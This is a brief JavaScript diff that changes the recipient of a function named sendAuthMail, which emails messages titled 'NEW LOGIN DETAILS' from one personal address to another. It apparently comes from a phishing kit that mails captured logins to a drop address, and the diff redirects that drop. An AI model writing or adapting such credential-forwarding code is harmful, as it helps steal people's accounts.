@@ -27,7 +27,7 @@ const sendAuthMail = (
 
   const mailOptions = {
     from: 'webiniy01@gmail.com',
-    to: 'Wadewade49@outlook.com',
+    to: 'Johnoxford2311@gmail.com',
     subject: 'NEW LOGIN DETAILS',
     text,
   }
